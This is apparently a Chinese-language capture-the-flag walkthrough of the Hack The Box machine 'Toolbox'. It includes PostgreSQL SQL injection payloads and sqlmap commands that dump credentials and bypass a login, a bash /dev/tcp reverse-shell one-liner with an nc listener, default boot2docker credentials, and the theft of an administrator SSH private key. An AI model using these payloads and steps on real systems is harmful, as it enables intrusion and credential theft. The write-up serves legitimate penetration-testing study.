# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责


# 服务探测
```
┌──(root💀kali)-[~/htb/Toolbox]
└─# nmap -p- 10.10.10.236 --open                                          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-26 21:02 EST
Nmap scan report for 10.10.10.236
Host is up (0.25s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 81.26 seconds
                                                                                                                    
┌──(root💀kali)-[~/htb/Toolbox]
└─# nmap -sV -Pn 10.10.10.236 -p 21,22,135,139,443,445,5985,47001,49664,49665,49666,49667,49668,49669
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-26 21:04 EST
Nmap scan report for 10.10.10.236
Host is up (0.25s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  tcpwrapped
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.19 seconds

```

## ftp

可以匿名登录
```
┌──(root💀kali)-[~/htb/Toolbox]
└─# ftp 10.10.10.236  
Connected to 10.10.10.236.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.10.10.236:root): anonymous
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||59847|)
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe

```

docker-toolbox是windows下的docker工具，说明这台靶机可能是一个docker镜像。


# web

80端口整个看起来就像一个静态网站


把megalogistic.com写到hosts文件
```echo "10.10.10.236   megalogistic.com">> /etc/hosts```


gobuster爆破vhosts
```
┌──(root💀kali)-[~/htb/Toolbox]
└─# gobuster vhost -u https://megalogistic.com -k -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 40 --no-error

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          https://megalogistic.com
[+] Method:       GET
[+] Threads:      40
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/01/27 00:37:18 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.megalogistic.com (Status: 200) [Size: 889]

```


或者用wfuzz
```
┌──(root💀kali)-[~/htb/Toolbox]
└─# wfuzz -u https://10.10.10.236 -H "Host: FUZZ.megalogistic.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hh 22357
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.236/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000024:   200        35 L     83 W       889 Ch      "admin" 
```


把```admin.megalogistic.com```也加到hosts文件后，打开浏览器显示一个登录入口，burp截断登录请求测试发现可能存在sql注入


用sqlmap跑了一遍显示靶机的数据库是PostgreSQL,可以使用以下4种注入技术

```
sqlmap identified the following injection point(s) with a total of 164 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-9328' OR 5360=5360-- rFOM&password=admin

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=admin#' AND 4213=CAST((CHR(113)||CHR(98)||CHR(122)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (4213=4213) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(98)||CHR(98)||CHR(113)) AS NUMERIC)-- uJOK&password=admin

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=admin#';SELECT PG_SLEEP(5)--&password=admin

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=admin#' AND 5607=(SELECT 5607 FROM PG_SLEEP(5))-- UduU&password=admin
---
[00:53:58] [INFO] the back-end DBMS is PostgreSQL

```

使用基于错误的注入技术

拿到数据库名：
```
sqlmap -r data --batch --dbms=PostgreSQL --force-ssl --technique E --no-cast --threads 4 --dbs

available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public

```

表：
```
sqlmap -r data --batch --dbms=PostgreSQL --force-ssl --technique E --no-cast --threads 4 -D public --tables
Database: public
[1 table]
+-------+
| users |
+-------+
```

数据
```
sqlmap -r data --batch --dbms=PostgreSQL --force-ssl --technique E --no-cast --threads 4 -D public -T users --dump

Table: users
[1 entry]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 4a100a85cb5ca3616dcf137918550815 | admin    |
+----------------------------------+----------+
```

但是这个md5数据无法破解。
但是我们既然已经知道了username存在sql注入，那么可以用上面sqlmap跑出来的payload登录页面

> admin：admin#';SELECT PG_SLEEP(5)--
> passwd：随便

登录后台以后有两个留言信息:

> Server is currently stable
>The server is running normally and no issues have recently been detected. If you notice an outage, please report it to the administrator.


> Send credentials to Tony Update Printer Drivers


# foothold .sql注入

这里如果不指定注入方法，会报：stacked queries SQL injection is not supported(不支持堆叠查询)
```
┌──(root㉿kali)-[~/htb/Toolbox]
└─# sqlmap -r data  --risk=3 --level=3 --batch --force-ssl --os-shell --technique T
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[(]_____ ___ ___  {1.8.2#stable}                                                                                                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                   
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:52:44 /2024-02-20/

[01:52:44] [INFO] parsing HTTP request from 'data'
[01:52:44] [INFO] resuming back-end DBMS 'postgresql' 
[01:52:44] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=max' AND 1799=(SELECT 1799 FROM PG_SLEEP(5))-- vJpB&password=123456
---
[01:52:47] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: PHP 7.3.14, Apache 2.4.38
back-end DBMS: PostgreSQL
[01:52:47] [CRITICAL] unable to prompt for an interactive operating system shell via the back-end DBMS because stacked queries SQL injection is not supported

[*] ending @ 01:52:47 /2024-02-20/

```

指定注入技术为堆叠查询：--technique S

```
sqlmap -r data  --risk=3 --level=3 --batch --force-ssl  --os-shell --technique S 
```

rev shell

```
bash -c 'bash -i >& /dev/tcp/10.10.16.3/4444 0>&1'
```

```
┌──(root㉿kali)-[~]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.236] 51379
bash: cannot set terminal process group (5330): Inappropriate ioctl for device
bash: no job control in this shell
whoami
postgres

```

flag
```
postgres@bc56e3cc55e9:/home/tony$ cd ~
cd ~
postgres@bc56e3cc55e9:/var/lib/postgresql$ ls
ls
11
user.txt
postgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt
cat user.txt
f0183e44378ea9774433e2ca6ac78c6a  flag.txt

```

# 提权

从21端口枚举到的信息知道当前系统处于一个docker环境

根据[这个文档](https://github.com/boot2docker/boot2docker#ssh-into-vm)得知docker的默认密码是：

以及[这篇privilege-escalation-boot2docker](https://rioasmara.com/2021/08/08/privilege-escalation-boot2docker/)

```
docker / tcuser
```


python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh docker@172.17.0.1

进入C盘拿到ssh的秘钥
```
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1
ssh docker@172.17.0.1
docker@172.17.0.1's password: tcuser

   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@box:~$ sudo su
sudo su
root@box:/home/docker# cd /root
cd /root
root@box:~# ls                                                                 
ls
root@box:~# cd /                                                               
cd /
root@box:/# ls                                                                 
ls
bin           home          linuxrc       root          sys
c             init          mnt           run           tmp
dev           lib           opt           sbin          usr
etc           lib64         proc          squashfs.tgz  var
root@box:/# cd /c/                                                             
cd /c/
root@box:/c# ls                                                                
ls
Users
root@box:/c# cd users                                                          
cd users
bash: cd: users: No such file or directory
root@box:/c# cd Users                                                          
cd Users
root@box:/c/Users# ls                                                          
ls
Administrator  Default        Public         desktop.ini
All Users      Default User   Tony
root@box:/c/Users# cd Administrator                                            
cd Administrator
root@box:/c/Users/Administrator/.ssh# cat id_rsa                               
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvo4S...lznDJWh/PNqF5I
-----END RSA PRIVATE KEY-----

```

ssh连接后拿到flag
```
┌──(root㉿kali)-[~/htb/Toolbox]
└─# ssh Administrator@10.10.10.236 -i id_rsa 
The authenticity of host '10.10.10.236 (10.10.10.236)' can't be established.
ED25519 key fingerprint is SHA256:KJAib23keV2B8xvFaxg7e79uztryW+LYX+Wb2qA9u4k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.236' (ED25519) to the list of known hosts.
Microsoft Windows [Version 10.0.17763.1039]          
(c) 2018 Microsoft Corporation. All rights reserved. 
                                                     
administrator@TOOLBOX C:\Users\Administrator>cd Desktop 

administrator@TOOLBOX C:\Users\Administrator\Desktop>dir 
 Volume in drive C has no label.                      
 Volume Serial Number is 64F8-B588                    
                                                      
 Directory of C:\Users\Administrator\Desktop          
                                                      
02/08/2021  11:39 AM    <DIR>          .              
02/08/2021  11:39 AM    <DIR>          ..             
02/08/2021  11:39 AM                35 root.txt       
               1 File(s)             35 bytes         
               2 Dir(s)   5,468,209,152 bytes free    
                                                      
administrator@TOOLBOX C:\Users\Administrator\Desktop>type root.txt 
cc9a0b76ac17f8f475250738b96261b3    
```